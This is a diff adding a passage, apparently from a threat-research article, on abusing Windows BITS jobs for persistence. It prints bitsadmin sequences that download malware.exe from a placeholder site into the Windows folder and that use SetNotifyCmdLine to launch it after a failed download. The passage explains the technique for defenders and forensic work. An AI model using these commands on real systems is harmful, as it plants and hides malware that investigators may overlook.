@@ -1,0 +1,15 @@
+
+Since the command data for BITS jobs is stored to a database rather than traditional registry locations, it can be overlooked by tools that attempt to identify persistence executables and commands or by forensic investigators.
+BITS jobs can be created using API function calls or via the bitsadmin command line tool.
+See Figure 1 and Figure 2 for an example of how a BITS job can be used to download a file and trigger execution.
+> bitsadmin /create download > bitsadmin /addfile
+download https://<site>/malware.exe c:\\windows\\malware.exe > bitsadmin /resume
+download > bitsadmin /complete
+download Created job {EA8603EB-7CC2-44EC-B1EE-E9923290C2ED}.
+Added https://<site>/malware.exe -> c:\\windows\\malware.exe to job.
+Job resumed.
+Job completed.
+Figure 1: Using bitsadmin to create a job that downloads a malicious executable and stores it to c:\\windows\\malware.exe.
+> bitsadmin /create persistence > bitsadmin /addfile persistence http://127.0.0.1/invalid.exe c:\\windows\\i.exe > bitsadmin /SetNotifyCmdLine
+persistence c:\\windows\\malware.exe NULL > bitsadmin /resume persistence Figure 2:
+Using bitsadmin to create a job that will launch malware.exe after attempting to download an invalid URL.
